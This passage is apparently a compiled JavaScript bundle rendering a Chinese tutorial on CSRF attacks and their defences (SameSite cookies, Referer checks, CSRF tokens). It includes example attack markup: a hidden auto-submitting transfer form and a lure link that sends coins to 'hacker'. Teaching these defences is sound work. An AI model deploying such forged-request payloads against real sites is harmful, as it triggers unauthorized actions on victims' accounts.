punctuation\"}},[t._v('\"')]),t._v(\"user\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"value\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"hacker\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"/>\")])]),t._v(\"\\n    \"),e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"<\")]),t._v(\"input\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"type\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"hidden\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"name\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"number\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"value\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"100\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"/>\")])]),t._v(\" \\n\"),e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"</\")]),t._v(\"form\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\" \\n\"),e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"<\")]),t._v(\"script\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),e(\"span\",{pre:!0,attrs:{class:\"token script\"}},[e(\"span\",{pre:!0,attrs:{class:\"token language-javascript\"}},[t._v(\" document\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\".\")]),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"getElementById\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v(\"'hacker-form'\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\".\")]),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"submit\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\" \")])]),e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"</\")]),t._v(\"script\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\"\\n\")])])]),e(\"p\",[t._v(\"我们可以看到黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交之后，服务器就会执行转账操作。。因此使用构建自动提交表单这种方式，就可以自动实现跨站点 POST 数据提交\")]),t._v(\" \"),e(\"ol\",{attrs:{start:\"3\"}},[e(\"li\",[e(\"strong\",[t._v(\"引诱用户点击链接\")])])]),t._v(\" \"),e(\"p\",[t._v(\"除了自动发起 Get 和 Post 请求之外，还有一种方式是诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接。\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-html extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-html\"}},[e(\"code\",[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"<\")]),t._v(\"div\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\" \\n    \"),e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"<\")]),t._v(\"img\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"width\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),t._v(\"150\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"src\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),t._v(\"http://images.xuejuzi.cn/1612/1_161230185104_1.jpg\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"/>\")])]),t._v(\" \\n    \"),e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"<\")]),t._v(\"a\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"href\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"https://time.geekbang.org/sendcoin?user=hacker&number=100\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"taget\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"_blank\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\"\\n\\t\\t点击砍渣渣辉\\n    \"),e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"</\")]),t._v(\"a\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\"\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"</\")]),t._v(\"div\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\"\\n\")])])]),e(\"p\",[e(\"strong\",[t._v(\"和 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击\")]),t._v(\"。\")]),t._v(\" \"),e(\"h3\",{attrs:{id:\"如何防止csrf攻击\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#如何防止csrf攻击\"}},[t._v(\"#\")]),t._v(\" 如何防止CSRF攻击\")]),t._v(\" \"),e(\"p\",[t._v(\"CSRF攻击必要条件\")]),t._v(\" \"),e(\"ul\",[e(\"li\",[t._v(\"目标站点有漏洞\")]),t._v(\" \"),e(\"li\",[t._v(\"用户登录过并保存在浏览器登录状态\")]),t._v(\" \"),e(\"li\",[t._v(\"用户打开第三方站点\")])]),t._v(\" \"),e(\"p\",[t._v(\"CSRF不会恶意注入脚本，所以黑客无法获取用户数据。只能间接利用用户数据进行操作，主要是找服务器漏洞。\")]),t._v(\" \"),e(\"p\",[t._v(\"要让服务器避免遭受到 CSRF 攻击，通常有以下几种途径。\")]),t._v(\" \"),e(\"h4\",{attrs:{id:\"充分利用好cookie的samesite-属性\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#充分利用好cookie的samesite-属性\"}},[t._v(\"#\")]),t._v(\" 充分利用好Cookie的SameSite 属性\")]),t._v(\" \"),e(\"p\",[t._v(\"Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据\")]),t._v(\" \"),e(\"p\",[t._v(\"通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 请求时，有如下区别：\")]),t._v(\" \"),e(\"p\",[t._v(\"如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器。\")]),t._v(\" \"),e(\"p\",[t._v(\"如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送\")]),t._v(\" \"),e(\"p\",[t._v(\"在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项。\")]),t._v(\" \"),e(\"p\",[t._v(\"SameSite有三个值。\")]),t._v(\" \"),e(\"ul\",[e(\"li\",[t._v(\"Strict 最为严格浏览器会完全禁止第三方Cookie。\")]),t._v(\" \"),e(\"li\",[t._v(\"lax相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie\")]),t._v(\" \"),e(\"li\",[t._v(\"果使用 None 的话，在任何情况下都会发送 Cookie 数据\")])]),t._v(\" \"),e(\"p\",[t._v(\"对于防范 CSRF 攻击，我们可以针对实际情况将一些关键的 Cookie 设置为 Strict 或者 Lax模式，这样在跨站点请求时，这些关键的 Cookie 就不会被发送到服务器，从而使得黑客的CSRF 攻击失效\")]),t._v(\" \"),e(\"h4\",{attrs:{id:\"验证请求的来源站点\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#验证请求的来源站点\"}},[t._v(\"#\")]),t._v(\" 验证请求的来源站点\")]),t._v(\" \"),e(\"p\",[e(\"strong\",[t._v(\"Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址\")]),t._v(\"。\")]),t._v(\" \"),e(\"h4\",{attrs:{id:\"csrf-token\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#csrf-token\"}},[t._v(\"#\")]),t._v(\" CSRF Token\")]),t._v(\" \"),e(\"p\",[t._v(\"第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。\")]),t._v(\" \"),e(\"p\",[t._v(\"第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"浏览器和os的隔离墙-安全沙箱\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#浏览器和os的隔离墙-安全沙箱\"}},[t._v(\"#\")]),t._v(\" 浏览器和OS的隔离墙-安全沙箱\")])])}),[],!1,null,null,null);a.default=n.exports}}]);","extractedComments":[]}